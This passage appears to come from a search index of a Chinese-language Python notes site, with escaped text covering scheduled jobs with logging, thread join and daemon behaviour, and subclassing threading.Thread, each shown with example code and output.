\u8bbe\u7f6e\u65e5\u5fd7\u6587\u4ef6 handler = logging.handlers.RotatingFileHandler(logfilename, encoding='utf-8', maxBytes=100 * 1024 * 1024, backupCount=10) # \u8f93\u51fa\u5230\u6587\u4ef6\u7684\u65e5\u5fd7\u7ea7\u522b handler.setLevel(logging.INFO) # \u65e5\u5fd7\u6837\u5f0f formatter = logging.Formatter( '%(asctime)s-%(name)s-%(filename)s-[line:%(lineno)d]-%(levelname)s-[\u65e5\u5fd7\u4fe1\u606f]: %(message)s') # \u63a7\u5236\u53f0\u65e5\u5fd7\u6837\u5f0f formatter_color = colorlog.ColoredFormatter( '%(log_color)s%(asctime)s-%(name)s-%(filename)s-[line:%(lineno)d]-%(levelname)s-[\u65e5\u5fd7\u4fe1\u606f]: %(message)s', log_colors=log_colors_config) # \u63a7\u5236\u53f0\u7684\u65e5\u5fd7 console = logging.StreamHandler(stream=sys.stdout) # \u63a7\u5236\u53f0\u7684\u65e5\u5fd7\u7ea7\u522b console.setLevel(logging.DEBUG) # \u8bbe\u7f6e\u65e5\u5fd7\u6837\u5f0f handler.setFormatter(formatter) console.setFormatter(formatter_color) logger.addHandler(handler) logger.addHandler(console) #\u9700\u8981\u5b9a\u65f6\u6267\u884c\u7684\u4efb\u52a1 def job(): logger.info(\"I'm working...\") #\u8bbe\u7f6e\u4e3a1\u5206\u949f\u4e00\u6b21 schedule.every(1).minute.do(job) #\u67e5\u770b\u4efb\u52a1\u6267\u884c\u65f6\u95f4\u7684\u65b9\u6cd5\uff0c\u6b7b\u5faa\u73af def see_cron(): while True: time.sleep(10) all_jobs = schedule.get_jobs() logger.info(all_jobs) #\u540e\u53f0\u6267\u884csee_cron t1 = threading.Thread(target=see_cron) #\u8ba9\u8fd9\u4e2a\u4efb\u52a1\u968f\u4e3b\u7ebf\u7a0b\u9000\u51fa\u800c\u9000\u51fa t1.setDaemon(True) t1.start() #\u6253\u5f00\u5b9a\u65f6\u4efb\u52a1\u8fdb\u7a0b while True: schedule.run_pending() time.sleep(1) \u7ed3\u679c\uff1a 2021-11-10 16:25:45,195-__main__-learn_schedule_catch.py-[line:56]-INFO-[\u65e5\u5fd7\u4fe1\u606f]: [Every 1 minute do job() (last run: [never], next run: 2021-11-10 16:26:15)] 2021-11-10 16:25:55,198-__main__-learn_schedule_catch.py-[line:56]-INFO-[\u65e5\u5fd7\u4fe1\u606f]: [Every 1 minute do job() (last run: [never], next run: 2021-11-10 16:26:15)] 2021-11-10 16:26:05,206-__main__-learn_schedule_catch.py-[line:56]-INFO-[\u65e5\u5fd7\u4fe1\u606f]: [Every 1 minute do job() (last run: [never], next run: 2021-11-10 16:26:15)] 2021-11-10 16:26:15,209-__main__-learn_schedule_catch.py-[line:56]-INFO-[\u65e5\u5fd7\u4fe1\u606f]: [Every 1 minute do job() (last run: [never], next run: 2021-11-10 16:26:15)] 2021-11-10 16:26:15,261-__main__-learn_schedule_catch.py-[line:44]-INFO-[\u65e5\u5fd7\u4fe1\u606f]: I'm working...","title":"schedule  \u65e5\u5fd7\u663e\u793a\u4e0b\u6b21\u4efb\u52a1\u6267\u884c\u65f6\u95f4"},{"location":"programming_language/python/threading/join/","text":"join\u7684\u4f5c\u7528 \u603b\u7ed3 join\u65b9\u6cd5\u7684\u4f5c\u7528\u662f\u963b\u585e\u4e3b\u8fdb\u7a0b\uff08\u6321\u4f4f\uff0c\u65e0\u6cd5\u6267\u884cjoin\u4ee5\u540e\u7684\u8bed\u53e5\uff09\uff0c\u4e13\u6ce8\u6267\u884c\u591a\u7ebf\u7a0b\u3002 \u591a\u7ebf\u7a0b\u591ajoin\u7684\u60c5\u51b5\u4e0b\uff0c\u4f9d\u6b21\u6267\u884c\u5404\u7ebf\u7a0b\u7684join\u65b9\u6cd5\uff0c\u524d\u5934\u4e00\u4e2a\u7ed3\u675f\u4e86\u624d\u80fd\u6267\u884c\u540e\u9762\u4e00\u4e2a\u3002 \u65e0\u53c2\u6570\uff0c\u5219\u7b49\u5f85\u5230\u8be5\u7ebf\u7a0b\u7ed3\u675f\uff0c\u624d\u5f00\u59cb\u6267\u884c\u4e0b\u4e00\u4e2a\u7ebf\u7a0b\u7684join\u3002 \u8bbe\u7f6e\u53c2\u6570\u540e\uff0c\u5219\u7b49\u5f85\u8be5\u7ebf\u7a0b\u8fd9\u4e48\u957f\u65f6\u95f4\u5c31\u4e0d\u7ba1\u5b83\u4e86\uff08\u800c\u8be5\u7ebf\u7a0b\u5e76\u6ca1\u6709\u7ed3\u675f\uff09\u3002\u4e0d\u7ba1\u7684\u610f\u601d\u5c31\u662f\u53ef\u4ee5\u6267\u884c\u540e\u9762\u7684\u4e3b\u8fdb\u7a0b\u4e86\u3002 Join & Daemon join \u5b57\u9762\u610f\u601d\uff1a \u8054\u5408 daemon \u5b57\u9762\u610f\u601d\uff1a \u5b88\u62a4 \u6b63\u5e38\u7684\u591a\u7ebf\u7a0b\uff0cA\u5f00\u542f\u4e86B\uff0cA\u548cB\u662f\u4e24\u4e2a\u72ec\u7acb\u7684\u7ebf\u7a0b\uff0c\u4e92\u4e0d\u5e72\u6270 \u4e3b\u7ebf\u7a0bA\u4e2d\uff0c\u521b\u5efa\u4e86\u5b50\u7ebf\u7a0bB\uff0c\u5e76\u4e14\u5728\u4e3b\u7ebf\u7a0bA\u4e2d\u8c03\u7528\u4e86 B.setDaemon() \uff0c\u6211\u7684\u7406\u89e3\u5c31\u662f\u8ba9B\u5b88\u62a4A\uff0cA\u8fdb\u7a0b\u7ed3\u675f\u4e86\uff0c\u5c31\u4e0d\u7ba1\u5b50\u7ebf\u7a0bB\u662f\u5426\u5b8c\u6210\uff0c\u4e00\u5e76\u548c\u4e3b\u7ebf\u7a0bA\u9000\u51fa\u3002\u8fd9\u5c31\u662f setDaemon \u65b9\u6cd5\u7684\u542b\u4e49 \u4e3b\u7ebf\u7a0bA\u4e2d\uff0c\u521b\u5efa\u4e86\u5b50\u7ebf\u7a0bB\uff0c\u5e76\u4e14\u5728\u4e3b\u7ebf\u7a0bA\u4e2d\u8c03\u7528\u4e86 B.join() \uff0c\u6211\u7684\u7406\u89e3\u5c31\u662f\u8ba9B\u8054\u5408A\uff0cA\u8fdb\u7a0b\u7ed3\u675f\u4e86\uff0c\u5c31\u4f1a\u8fdb\u5165\u963b\u585e\u72b6\u6001\u7b49\u5f85B\uff0c\u7b49\u5f85B\u7ed3\u675f\uff0cA\u624d\u9000\u51fa \u4e0b\u9762\u4ec5\u4ee5\u591a\u7ebf\u7a0b\u4e3a\u4f8b\uff1a \u9996\u5148\u9700\u8981\u660e\u786e\u51e0\u4e2a\u6982\u5ff5\uff1a \u5f53\u4e00\u4e2a\u8fdb\u7a0b\u542f\u52a8\u4e4b\u540e\uff0c\u4f1a\u9ed8\u8ba4\u4ea7\u751f\u4e00\u4e2a\u4e3b\u7ebf\u7a0b\uff0c\u56e0\u4e3a\u7ebf\u7a0b\u662f\u7a0b\u5e8f\u6267\u884c\u6d41\u7684\u6700\u5c0f\u5355\u5143\uff0c\u5f53\u8bbe\u7f6e\u591a\u7ebf\u7a0b\u65f6\uff0c\u4e3b\u7ebf\u7a0b\u4f1a\u521b\u5efa\u591a\u4e2a\u5b50\u7ebf\u7a0b\uff0c\u5728python\u4e2d\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff08\u5176\u5b9e\u5c31\u662f setDaemon(False) \uff0c\u4e3b\u7ebf\u7a0b\u6267\u884c\u5b8c\u81ea\u5df1\u7684\u4efb\u52a1\u4ee5\u540e\uff0c\u5c31\u9000\u51fa\u4e86\uff0c\u6b64\u65f6\u5b50\u7ebf\u7a0b\u4f1a\u7ee7\u7eed\u6267\u884c\u81ea\u5df1\u7684\u4efb\u52a1\uff0c\u76f4\u5230\u81ea\u5df1\u7684\u4efb\u52a1\u7ed3\u675f\uff0c\u4f8b\u5b50\u89c1\u4e0b\u9762\u4e00\u3002 \u5f53\u6211\u4eec\u4f7f\u7528 setDaemon(True) \u65b9\u6cd5\uff0c\u8bbe\u7f6e\u5b50\u7ebf\u7a0b\u4e3a\u5b88\u62a4\u7ebf\u7a0b\u65f6\uff0c\u4e3b\u7ebf\u7a0b\u4e00\u65e6\u6267\u884c\u7ed3\u675f\uff0c\u5219\u5168\u90e8\u7ebf\u7a0b\u5168\u90e8\u88ab\u7ec8\u6b62\u6267\u884c\uff0c\u53ef\u80fd\u51fa\u73b0\u7684\u60c5\u51b5\u5c31\u662f\uff0c\u5b50\u7ebf\u7a0b\u7684\u4efb\u52a1\u8fd8\u6ca1\u6709\u5b8c\u5168\u6267\u884c\u7ed3\u675f\uff0c\u5c31\u88ab\u8feb\u505c\u6b62\uff0c\u4f8b\u5b50\u89c1\u4e0b\u9762\u4e8c\u3002 \u6b64\u65f6join\u7684\u4f5c\u7528\u5c31\u51f8\u663e\u51fa\u6765\u4e86\uff0cjoin\u6240\u5b8c\u6210\u7684\u5de5\u4f5c\u5c31\u662f\u7ebf\u7a0b\u540c\u6b65\uff0c\u5373\u4e3b\u7ebf\u7a0b\u4efb\u52a1\u7ed3\u675f\u4e4b\u540e\uff0c\u8fdb\u5165\u963b\u585e\u72b6\u6001\uff0c\u4e00\u76f4\u7b49\u5f85\u5176\u4ed6\u7684\u5b50\u7ebf\u7a0b\u6267\u884c\u7ed3\u675f\u4e4b\u540e\uff0c\u4e3b\u7ebf\u7a0b\u5728\u7ec8\u6b62\uff0c\u4f8b\u5b50\u89c1\u4e0b\u9762\u4e09\u3002 \u4e00\uff1aPython\u591a\u7ebf\u7a0b\u7684\u9ed8\u8ba4\u60c5\u51b5 import threading import time def run(): time.sleep(2) print('\u5f53\u524d\u7ebf\u7a0b\u7684\u540d\u5b57\u662f\uff1a ', threading.current_thread().name) time.sleep(2) if __name__ == '__main__': start_time = time.time() print('\u8fd9\u662f\u4e3b\u7ebf\u7a0b\uff1a', threading.current_thread().name) thread_list = [] for i in range(5): t = threading.Thread(target=run) thread_list.append(t) for t in thread_list: t.start() print('\u4e3b\u7ebf\u7a0b\u7ed3\u675f\uff01' , threading.current_thread().name) print('\u4e00\u5171\u7528\u65f6\uff1a', time.time()-start_time) \u5176\u6267\u884c\u7ed3\u679c\u5982\u4e0b\uff1a \u5173\u952e\u70b9\uff1a \u6211\u4eec\u7684\u8ba1\u65f6\u662f\u5bf9\u4e3b\u7ebf\u7a0b\u8ba1\u65f6\uff0c\u4e3b\u7ebf\u7a0b\u7ed3\u675f\uff0c\u8ba1\u65f6\u968f\u4e4b\u7ed3\u675f\uff0c\u6253\u5370\u51fa\u4e3b\u7ebf\u7a0b\u7684\u7528\u65f6\u3002 \u4e3b\u7ebf\u7a0b\u7684\u4efb\u52a1\u5b8c\u6210\u4e4b\u540e\uff0c\u4e3b\u7ebf\u7a0b\u968f\u4e4b\u7ed3\u675f\uff0c\u5b50\u7ebf\u7a0b\u7ee7\u7eed\u6267\u884c\u81ea\u5df1\u7684\u4efb\u52a1\uff0c\u76f4\u5230\u5168\u90e8\u7684\u5b50\u7ebf\u7a0b\u7684\u4efb\u52a1\u5168\u90e8\u7ed3\u675f\uff0c\u7a0b\u5e8f\u7ed3\u675f\u3002 \u4e8c\uff1a\u8bbe\u7f6e\u5b88\u62a4\u7ebf\u7a0b import threading import time def run(): time.sleep(2) print('\u5f53\u524d\u7ebf\u7a0b\u7684\u540d\u5b57\u662f\uff1a ', threading.current_thread().name) time.sleep(2) if __name__ == '__main__': start_time = time.time() print('\u8fd9\u662f\u4e3b\u7ebf\u7a0b\uff1a', threading.current_thread().name) thread_list = [] for i in range(5): t = threading.Thread(target=run) thread_list.append(t) for t in thread_list: t.setDaemon(True) t.start() print('\u4e3b\u7ebf\u7a0b\u7ed3\u675f\u4e86\uff01' , threading.current_thread().name) print('\u4e00\u5171\u7528\u65f6\uff1a', time.time()-start_time) \u5176\u6267\u884c\u7ed3\u679c\u5982\u4e0b\uff0c\u6ce8\u610f\u8bf7\u786e\u4fddsetDaemon()\u5728start()\u4e4b\u524d\u3002 \u5173\u952e\u70b9\uff1a \u975e\u5e38\u660e\u663e\u7684\u770b\u5230\uff0c\u4e3b\u7ebf\u7a0b\u7ed3\u675f\u4ee5\u540e\uff0c\u5b50\u7ebf\u7a0b\u8fd8\u6ca1\u6709\u6765\u5f97\u53ca\u6267\u884c\uff0c\u6574\u4e2a\u7a0b\u5e8f\u5c31\u9000\u51fa\u4e86\u3002 \u4e09\uff1ajoin\u7684\u4f5c\u7528 import threading import time def run(): time.sleep(2) print('\u5f53\u524d\u7ebf\u7a0b\u7684\u540d\u5b57\u662f\uff1a ', threading.current_thread().name) time.sleep(2) if __name__ == '__main__': start_time = time.time() print('\u8fd9\u662f\u4e3b\u7ebf\u7a0b\uff1a', threading.current_thread().name) thread_list = [] for i in range(5): t = threading.Thread(target=run) thread_list.append(t) for t in thread_list: t.setDaemon(True) t.start() for t in thread_list: t.join() print('\u4e3b\u7ebf\u7a0b\u7ed3\u675f\u4e86\uff01' , threading.current_thread().name) print('\u4e00\u5171\u7528\u65f6\uff1a', time.time()-start_time) \u5176\u6267\u884c\u7ed3\u679c\u5982\u4e0b\uff1a \u5173\u952e\u70b9\uff1a \u53ef\u4ee5\u770b\u5230\uff0c\u4e3b\u7ebf\u7a0b\u4e00\u76f4\u7b49\u5f85\u5168\u90e8\u7684\u5b50\u7ebf\u7a0b\u7ed3\u675f\u4e4b\u540e\uff0c\u4e3b\u7ebf\u7a0b\u81ea\u8eab\u624d\u7ed3\u675f\uff0c\u7a0b\u5e8f\u9000\u51fa\u3002","title":"join\u7684\u4f5c\u7528"},{"location":"programming_language/python/threading/join/#join","text":"","title":"join\u7684\u4f5c\u7528"},{"location":"programming_language/python/threading/join/#_1","text":"join\u65b9\u6cd5\u7684\u4f5c\u7528\u662f\u963b\u585e\u4e3b\u8fdb\u7a0b\uff08\u6321\u4f4f\uff0c\u65e0\u6cd5\u6267\u884cjoin\u4ee5\u540e\u7684\u8bed\u53e5\uff09\uff0c\u4e13\u6ce8\u6267\u884c\u591a\u7ebf\u7a0b\u3002 \u591a\u7ebf\u7a0b\u591ajoin\u7684\u60c5\u51b5\u4e0b\uff0c\u4f9d\u6b21\u6267\u884c\u5404\u7ebf\u7a0b\u7684join\u65b9\u6cd5\uff0c\u524d\u5934\u4e00\u4e2a\u7ed3\u675f\u4e86\u624d\u80fd\u6267\u884c\u540e\u9762\u4e00\u4e2a\u3002 \u65e0\u53c2\u6570\uff0c\u5219\u7b49\u5f85\u5230\u8be5\u7ebf\u7a0b\u7ed3\u675f\uff0c\u624d\u5f00\u59cb\u6267\u884c\u4e0b\u4e00\u4e2a\u7ebf\u7a0b\u7684join\u3002 \u8bbe\u7f6e\u53c2\u6570\u540e\uff0c\u5219\u7b49\u5f85\u8be5\u7ebf\u7a0b\u8fd9\u4e48\u957f\u65f6\u95f4\u5c31\u4e0d\u7ba1\u5b83\u4e86\uff08\u800c\u8be5\u7ebf\u7a0b\u5e76\u6ca1\u6709\u7ed3\u675f\uff09\u3002\u4e0d\u7ba1\u7684\u610f\u601d\u5c31\u662f\u53ef\u4ee5\u6267\u884c\u540e\u9762\u7684\u4e3b\u8fdb\u7a0b\u4e86\u3002 Join & Daemon join \u5b57\u9762\u610f\u601d\uff1a \u8054\u5408 daemon \u5b57\u9762\u610f\u601d\uff1a \u5b88\u62a4 \u6b63\u5e38\u7684\u591a\u7ebf\u7a0b\uff0cA\u5f00\u542f\u4e86B\uff0cA\u548cB\u662f\u4e24\u4e2a\u72ec\u7acb\u7684\u7ebf\u7a0b\uff0c\u4e92\u4e0d\u5e72\u6270 \u4e3b\u7ebf\u7a0bA\u4e2d\uff0c\u521b\u5efa\u4e86\u5b50\u7ebf\u7a0bB\uff0c\u5e76\u4e14\u5728\u4e3b\u7ebf\u7a0bA\u4e2d\u8c03\u7528\u4e86 B.setDaemon() \uff0c\u6211\u7684\u7406\u89e3\u5c31\u662f\u8ba9B\u5b88\u62a4A\uff0cA\u8fdb\u7a0b\u7ed3\u675f\u4e86\uff0c\u5c31\u4e0d\u7ba1\u5b50\u7ebf\u7a0bB\u662f\u5426\u5b8c\u6210\uff0c\u4e00\u5e76\u548c\u4e3b\u7ebf\u7a0bA\u9000\u51fa\u3002\u8fd9\u5c31\u662f setDaemon \u65b9\u6cd5\u7684\u542b\u4e49 \u4e3b\u7ebf\u7a0bA\u4e2d\uff0c\u521b\u5efa\u4e86\u5b50\u7ebf\u7a0bB\uff0c\u5e76\u4e14\u5728\u4e3b\u7ebf\u7a0bA\u4e2d\u8c03\u7528\u4e86 B.join() \uff0c\u6211\u7684\u7406\u89e3\u5c31\u662f\u8ba9B\u8054\u5408A\uff0cA\u8fdb\u7a0b\u7ed3\u675f\u4e86\uff0c\u5c31\u4f1a\u8fdb\u5165\u963b\u585e\u72b6\u6001\u7b49\u5f85B\uff0c\u7b49\u5f85B\u7ed3\u675f\uff0cA\u624d\u9000\u51fa \u4e0b\u9762\u4ec5\u4ee5\u591a\u7ebf\u7a0b\u4e3a\u4f8b\uff1a \u9996\u5148\u9700\u8981\u660e\u786e\u51e0\u4e2a\u6982\u5ff5\uff1a \u5f53\u4e00\u4e2a\u8fdb\u7a0b\u542f\u52a8\u4e4b\u540e\uff0c\u4f1a\u9ed8\u8ba4\u4ea7\u751f\u4e00\u4e2a\u4e3b\u7ebf\u7a0b\uff0c\u56e0\u4e3a\u7ebf\u7a0b\u662f\u7a0b\u5e8f\u6267\u884c\u6d41\u7684\u6700\u5c0f\u5355\u5143\uff0c\u5f53\u8bbe\u7f6e\u591a\u7ebf\u7a0b\u65f6\uff0c\u4e3b\u7ebf\u7a0b\u4f1a\u521b\u5efa\u591a\u4e2a\u5b50\u7ebf\u7a0b\uff0c\u5728python\u4e2d\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff08\u5176\u5b9e\u5c31\u662f setDaemon(False) \uff0c\u4e3b\u7ebf\u7a0b\u6267\u884c\u5b8c\u81ea\u5df1\u7684\u4efb\u52a1\u4ee5\u540e\uff0c\u5c31\u9000\u51fa\u4e86\uff0c\u6b64\u65f6\u5b50\u7ebf\u7a0b\u4f1a\u7ee7\u7eed\u6267\u884c\u81ea\u5df1\u7684\u4efb\u52a1\uff0c\u76f4\u5230\u81ea\u5df1\u7684\u4efb\u52a1\u7ed3\u675f\uff0c\u4f8b\u5b50\u89c1\u4e0b\u9762\u4e00\u3002 \u5f53\u6211\u4eec\u4f7f\u7528 setDaemon(True) \u65b9\u6cd5\uff0c\u8bbe\u7f6e\u5b50\u7ebf\u7a0b\u4e3a\u5b88\u62a4\u7ebf\u7a0b\u65f6\uff0c\u4e3b\u7ebf\u7a0b\u4e00\u65e6\u6267\u884c\u7ed3\u675f\uff0c\u5219\u5168\u90e8\u7ebf\u7a0b\u5168\u90e8\u88ab\u7ec8\u6b62\u6267\u884c\uff0c\u53ef\u80fd\u51fa\u73b0\u7684\u60c5\u51b5\u5c31\u662f\uff0c\u5b50\u7ebf\u7a0b\u7684\u4efb\u52a1\u8fd8\u6ca1\u6709\u5b8c\u5168\u6267\u884c\u7ed3\u675f\uff0c\u5c31\u88ab\u8feb\u505c\u6b62\uff0c\u4f8b\u5b50\u89c1\u4e0b\u9762\u4e8c\u3002 \u6b64\u65f6join\u7684\u4f5c\u7528\u5c31\u51f8\u663e\u51fa\u6765\u4e86\uff0cjoin\u6240\u5b8c\u6210\u7684\u5de5\u4f5c\u5c31\u662f\u7ebf\u7a0b\u540c\u6b65\uff0c\u5373\u4e3b\u7ebf\u7a0b\u4efb\u52a1\u7ed3\u675f\u4e4b\u540e\uff0c\u8fdb\u5165\u963b\u585e\u72b6\u6001\uff0c\u4e00\u76f4\u7b49\u5f85\u5176\u4ed6\u7684\u5b50\u7ebf\u7a0b\u6267\u884c\u7ed3\u675f\u4e4b\u540e\uff0c\u4e3b\u7ebf\u7a0b\u5728\u7ec8\u6b62\uff0c\u4f8b\u5b50\u89c1\u4e0b\u9762\u4e09\u3002","title":"\u603b\u7ed3"},{"location":"programming_language/python/threading/join/#python","text":"import threading import time def run(): time.sleep(2) print('\u5f53\u524d\u7ebf\u7a0b\u7684\u540d\u5b57\u662f\uff1a ', threading.current_thread().name) time.sleep(2) if __name__ == '__main__': start_time = time.time() print('\u8fd9\u662f\u4e3b\u7ebf\u7a0b\uff1a', threading.current_thread().name) thread_list = [] for i in range(5): t = threading.Thread(target=run) thread_list.append(t) for t in thread_list: t.start() print('\u4e3b\u7ebf\u7a0b\u7ed3\u675f\uff01' , threading.current_thread().name) print('\u4e00\u5171\u7528\u65f6\uff1a', time.time()-start_time) \u5176\u6267\u884c\u7ed3\u679c\u5982\u4e0b\uff1a \u5173\u952e\u70b9\uff1a \u6211\u4eec\u7684\u8ba1\u65f6\u662f\u5bf9\u4e3b\u7ebf\u7a0b\u8ba1\u65f6\uff0c\u4e3b\u7ebf\u7a0b\u7ed3\u675f\uff0c\u8ba1\u65f6\u968f\u4e4b\u7ed3\u675f\uff0c\u6253\u5370\u51fa\u4e3b\u7ebf\u7a0b\u7684\u7528\u65f6\u3002 \u4e3b\u7ebf\u7a0b\u7684\u4efb\u52a1\u5b8c\u6210\u4e4b\u540e\uff0c\u4e3b\u7ebf\u7a0b\u968f\u4e4b\u7ed3\u675f\uff0c\u5b50\u7ebf\u7a0b\u7ee7\u7eed\u6267\u884c\u81ea\u5df1\u7684\u4efb\u52a1\uff0c\u76f4\u5230\u5168\u90e8\u7684\u5b50\u7ebf\u7a0b\u7684\u4efb\u52a1\u5168\u90e8\u7ed3\u675f\uff0c\u7a0b\u5e8f\u7ed3\u675f\u3002","title":"\u4e00\uff1aPython\u591a\u7ebf\u7a0b\u7684\u9ed8\u8ba4\u60c5\u51b5"},{"location":"programming_language/python/threading/join/#_2","text":"import threading import time def run(): time.sleep(2) print('\u5f53\u524d\u7ebf\u7a0b\u7684\u540d\u5b57\u662f\uff1a ', threading.current_thread().name) time.sleep(2) if __name__ == '__main__': start_time = time.time() print('\u8fd9\u662f\u4e3b\u7ebf\u7a0b\uff1a', threading.current_thread().name) thread_list = [] for i in range(5): t = threading.Thread(target=run) thread_list.append(t) for t in thread_list: t.setDaemon(True) t.start() print('\u4e3b\u7ebf\u7a0b\u7ed3\u675f\u4e86\uff01' , threading.current_thread().name) print('\u4e00\u5171\u7528\u65f6\uff1a', time.time()-start_time) \u5176\u6267\u884c\u7ed3\u679c\u5982\u4e0b\uff0c\u6ce8\u610f\u8bf7\u786e\u4fddsetDaemon()\u5728start()\u4e4b\u524d\u3002 \u5173\u952e\u70b9\uff1a \u975e\u5e38\u660e\u663e\u7684\u770b\u5230\uff0c\u4e3b\u7ebf\u7a0b\u7ed3\u675f\u4ee5\u540e\uff0c\u5b50\u7ebf\u7a0b\u8fd8\u6ca1\u6709\u6765\u5f97\u53ca\u6267\u884c\uff0c\u6574\u4e2a\u7a0b\u5e8f\u5c31\u9000\u51fa\u4e86\u3002","title":"\u4e8c\uff1a\u8bbe\u7f6e\u5b88\u62a4\u7ebf\u7a0b"},{"location":"programming_language/python/threading/join/#join_1","text":"import threading import time def run(): time.sleep(2) print('\u5f53\u524d\u7ebf\u7a0b\u7684\u540d\u5b57\u662f\uff1a ', threading.current_thread().name) time.sleep(2) if __name__ == '__main__': start_time = time.time() print('\u8fd9\u662f\u4e3b\u7ebf\u7a0b\uff1a', threading.current_thread().name) thread_list = [] for i in range(5): t = threading.Thread(target=run) thread_list.append(t) for t in thread_list: t.setDaemon(True) t.start() for t in thread_list: t.join() print('\u4e3b\u7ebf\u7a0b\u7ed3\u675f\u4e86\uff01' , threading.current_thread().name) print('\u4e00\u5171\u7528\u65f6\uff1a', time.time()-start_time) \u5176\u6267\u884c\u7ed3\u679c\u5982\u4e0b\uff1a \u5173\u952e\u70b9\uff1a \u53ef\u4ee5\u770b\u5230\uff0c\u4e3b\u7ebf\u7a0b\u4e00\u76f4\u7b49\u5f85\u5168\u90e8\u7684\u5b50\u7ebf\u7a0b\u7ed3\u675f\u4e4b\u540e\uff0c\u4e3b\u7ebf\u7a0b\u81ea\u8eab\u624d\u7ed3\u675f\uff0c\u7a0b\u5e8f\u9000\u51fa\u3002","title":"\u4e09\uff1ajoin\u7684\u4f5c\u7528"},{"location":"programming_language/python/threading/thread/","text":"\u901a\u8fc7\u7ee7\u627f\u5b9e\u73b0\u591a\u7ebf\u7a0b \u4e00\uff0c\u5b9e\u73b0run\u65b9\u6cd5 \u5148\u770b\u4e0d\u5e26init\u65b9\u6cd5\u7684 import time import threading class MyThread(threading.Thread): def run(self): time.sleep(1) a = 1 + 1 print(a) for _ in range(5): th = MyThread() th.start() \u7ed3\u679c\uff1a 2 2 2 2 2 \u5b9a\u4e49\u4e00\u4e2a\u7c7b\uff0c\u7ee7\u627f threading.Thread \u7c7b\uff0c\u91cc\u9762\u53ea\u9700\u8981\u5b9a\u4e49 run \u65b9\u6cd5 run \u65b9\u6cd5\u76f8\u5f53\u4e8e\u4e4b\u524d\u4f20\u5165 Thread \u7684\u90a3\u4e2a\u51fd\u6570\uff0c\u6ce8\u610f\u53ea\u80fd\u7528 run \u8fd9\u4e2a\u540d\u5b57\uff0c\u4e0d\u7528\u663e\u5f0f\u8c03\u7528\uff0c\u7ebf\u7a0b start() \u65f6\u4f1a\u81ea\u52a8\u8c03\u7528 run \u521b\u5efa\u7c7b\u7684\u5b9e\u4f8b\u65f6\u4e0d\u9700\u8981\u4f20\u5165\u53c2\u6570\uff0c\u5f97\u5230\u7684\u7ed3\u679c\u5c31\u53ef\u4ee5\u8c03\u7528 start join \u7b49\u65b9\u6cd5 Thread \u5bf9\u8c61\u53ef\u4ee5\u8c03\u7528 start join run \u7b49\u65b9\u6cd5\uff0c\u5176\u5b9e\u5f53\u65f6\u8c03\u7528 start \u5c31\u662f\u81ea\u52a8\u8c03\u7528\u4e86 run \u3002\u8fd9\u91cc\u53ea\u4e0d\u8fc7\u662f\u5728\u65b0\u7c7b\u4e2d\u91cd\u5199\u4e86 run \u65b9\u6cd5\uff0c\u7ebf\u7a0b\u8c03\u7528 start \u65f6\u5c31\u4f1a\u81ea\u52a8\u6267\u884c\u8fd9\u4e2a run \u4e8c\uff0c\u7528\u521d\u59cb\u5316\u65b9\u6cd5\u5b9e\u73b0\u4f20\u53c2 \u5e26\u521d\u59cb\u5316\u65b9\u6cd5\u7684\uff0c\u4e0a\u9762\u6bcf\u6b21\u8fd0\u884c\u7684 run \u90fd\u662f\u4e00\u6837\u7684\uff0c\u771f\u6b63\u4f7f\u7528\u65f6\u5f88\u5c11\u4f1a\u8fd9\u6837\u7528\uff0c\u6709\u65f6\u4f1a\u9700\u8981\u4f20\u5165\u4e00\u4e9b\u533a\u522b\u6027\u7684\u53c2\u6570\uff0c\u8fd9\u5c31\u9700\u8981\u5b9a\u4e49\u7c7b\u7684 __init__ \u4e86 import threading import requests from bs4 import BeautifulSoup class MyThread(threading.Thread): def __init__(self, i): threading.Thread.__init__(self) self.i = i def run(self): print(self.i) for i in range(10): th = MyThread(i) th.start() \u7ed3\u679c\uff1a 0 1 2 3 4 5 6 7 8 9 \u4e09\uff0c\u8c03\u7528Thrad\u5bf9\u8c61\u7684\u65b9\u6cd5 Thread \u51fd\u6570\u7684\u53c2\u6570\u3002\u521d\u59cb\u5316\u7ebf\u7a0b\u65f6\u4f20\u5165\u4e00\u4e9b\u53c2\u6570\uff0c\u8fd9\u91cc\u4e5f\u53ef\u4ee5\u5728 __init__ \u4e2d\u5b9a\u4e49 Thread \u5bf9\u8c61\u7684\u65b9\u6cd5\u3002\u8fd9\u91cc\u53ef\u4ee5\u7528 self \u76f4\u63a5\u8c03\u7528\u8fd9\u4e9b\u65b9\u6cd5 threading.activeCount() \u7b49\u76f4\u63a5\u8c03\u7528\u7684\u53d8\u91cf\u3002\u5728\u8fd9\u91cc\u4f9d\u7136\u53ef\u4ee5\u8c03\u7528 \u6240\u4ee5\u7528\u7c7b\u7684\u65b9\u6cd5\u4e0d\u4f1a\u6709\u4efb\u4f55\u9650\u5236\uff0c\u4e0b\u9762\u6765\u770b\u4e00\u4e2a\u4f8b\u5b50 import time import threading class MyThread(threading.Thread): def __init__(self, name): threading.Thread.__init__(self) self.name = name # \u8fd9\u6837\u5c31\u76f8\u5f53\u4e8eThread\u4e2d\u7684name\u53c2\u6570\u4e86 def run(self): a = 1 + 1 print(threading.currentThread().name) time.sleep(1) print(self.name) time.sleep(1) print(self.is_alive()) # \u672a\u663e\u5f0f\u5b9a\u4e49\u8fc7\u5c31\u53ef\u4ee5\u76f4\u63a5\u7528 t = time.time() ths = [MyThread('thread {}'.format(i)) for i in range(3)] print(\"len(ths):\"+str(len(ths))) for th in ths: th.start() print(\"threading.activeCount:\"+str(threading.activeCount())) for th in ths: th.join() print(time.time() - t) \u56db\uff0c\u7ed9run\u65b9\u6cd5\u4f20\u5165\u5199\u597d\u7684\u65b9\u6cd5 \u4e4b\u524d\u662f\u76f4\u63a5\u7528 run \u5b9a\u4e49\u8ba1\u7b97\u51fd\u6570\uff0c\u5982\u679c\u5df2\u7ecf\u6709\u4e00\u4e2a\u8ba1\u7b97\u51fd\u6570\uff0c\u4e5f\u53ef\u4ee5\u7528\u4f20\u5165\u7684\u65b9\u5f0f\u800c\u4e0d\u662f\u6539\u5199\u6210 run import threading def gettitle(page): print(\"page:\"+str(page)) class MyThread(threading.Thread): def __init__(self, target, **args): threading.Thread.__init__(self) self.target = target self.args = args def run(self): self.target(**self.args) for i in range(10): th = MyThread(gettitle, page = i) th.start() \u7ed3\u679c\uff1a page:0 page:1 page:2 page:3 page:4 page:5 page:6 page:7 page:8 